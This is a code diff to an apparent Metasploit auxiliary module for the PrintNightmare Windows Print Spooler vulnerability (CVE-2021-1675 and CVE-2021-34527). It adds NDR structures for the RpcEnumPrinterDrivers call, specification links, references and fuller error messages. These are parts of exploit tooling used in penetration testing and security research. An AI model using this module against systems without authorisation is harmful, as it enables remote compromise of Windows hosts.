@@ -13,6 +13,7 @@ module PrintSystem
   VER_MINOR = 0
 
   # Operation numbers
+  RPC_ENUM_PRINTER_DRIVERS = 10
   RPC_ADD_PRINTER_DRIVER_EX = 89
 
   # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b
@@ -26,7 +27,7 @@ module PrintSystem
   APD_INSTALL_WARNED_DRIVER = 0x00008000
   APD_RETURN_BLOCKING_STATUS_CODE = 0x00010000
 
-  # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/39bbfc30-8768-4cd4-9930-434857e2c2a2
+  # [2.2.1.5.2 DRIVER_INFO_2](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/39bbfc30-8768-4cd4-9930-434857e2c2a2)
   class DriverInfo2 < BinData::Record
     endian :little
 
@@ -59,7 +60,7 @@ module PrintSystem
     driver_info2 :referent, onlyif: -> { referent_id != 0 }
   end
 
-  # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/3a3f9cf7-8ec4-4921-b1f6-86cf8d139bc2
+  # [2.2.1.2.3 DRIVER_CONTAINER](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/3a3f9cf7-8ec4-4921-b1f6-86cf8d139bc2)
   class DriverContainer < BinData::Record
     endian :little
 
@@ -95,6 +96,7 @@ module PrintSystem
     end
   end
 
+  # [3.1.4.4.8 RpcAddPrinterDriverEx (Opnum 89)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b)
   class RpcAddPrinterDriverExResponse < BinData::Record
     attr_reader :opnum
 
@@ -106,6 +108,66 @@ module PrintSystem
     end
 
     uint32 :error_status
+  end
+
+  # for RpcEnumPrinterDrivers' `BYTE* pDriver` field
+  class NdrLpLpByte < RubySMB::Dcerpc::Ndr::NdrPointer
+    endian :little
+
+    ndr_lp_byte :referent, onlyif: -> { self.referent_id != 0 }
+  end
+
+  # [3.1.4.4.2 RpcEnumPrinterDrivers (Opnum 10)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/857d00ac-3682-4a0d-86ca-3d3c372e5e4a)
+  class RpcEnumPrinterDriversRequest < BinData::Record
+    attr_reader :opnum
+
+    endian :little
+
+    def initialize_instance
+      super
+      @opnum = RPC_ENUM_PRINTER_DRIVERS
+    end
+
+    ndr_lp_str          :p_name
+    string              :pad1, length: -> { pad_length(p_name) }
+    ndr_lp_str          :p_environment
+    string              :pad2, length: -> { pad_length(p_environment) }
+    uint32              :level
+    ndr_lp_lp_byte      :p_drivers
+    string              :pad3, length: -> { pad_length(p_drivers) }
+    uint32              :cb_buf
+
+    # Determines the correct length for the padding, so that the next
+    # field is 4-byte aligned.
+    def pad_length(prev_element)
+      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
+      (4 - offset) % 4
+    end
+  end
+
+  # [3.1.4.4.2 RpcEnumPrinterDrivers (Opnum 10)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/857d00ac-3682-4a0d-86ca-3d3c372e5e4a)
+  class RpcEnumPrinterDriversResponse < BinData::Record
+    attr_reader :opnum
+
+    endian :little
+
+    def initialize_instance
+      super
+      @opnum = RPC_ENUM_PRINTER_DRIVERS
+    end
+
+    ndr_lp_lp_byte    :p_drivers
+    string            :pad1, length: -> { pad_length(p_drivers) }
+    uint32            :pcb_needed
+    uint32            :pc_returned
+    uint32            :error_status
+
+    # Determines the correct length for the padding, so that the next
+    # field is 4-byte aligned.
+    def pad_length(prev_element)
+      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
+      (4 - offset) % 4
+    end
   end
 end
 
@@ -148,8 +210,10 @@ class MetasploitModule < Msf::Auxiliary
         'License' => MSF_LICENSE,
         'References' => [
           ['CVE', '2021-1675'],
+          ['CVE', '2021-34527'],
           ['URL', 'https://github.com/cube0x0/CVE-2021-1675'],
-          ['URL', 'https://github.com/afwu/PrintNightmare']
+          ['URL', 'https://github.com/afwu/PrintNightmare'],
+          ['URL', 'https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1']
         ],
         'Notes' => {
           'AKA' => [ 'PrintNightmare' ],
@@ -285,8 +349,8 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       raw_response = dcerpc.call(request.opnum, request.to_binary_s)
-    rescue Rex::Proto::DCERPC::Exceptions::Fault
-      fail_with(Failure::UnexpectedReply, "The #{name} Print System RPC request failed")
+    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
+      fail_with(Failure::UnexpectedReply, "The #{name} Print System RPC request failed (#{e.message}).")
     end
 
     PrintSystem.const_get("#{name}Response").read(raw_response)
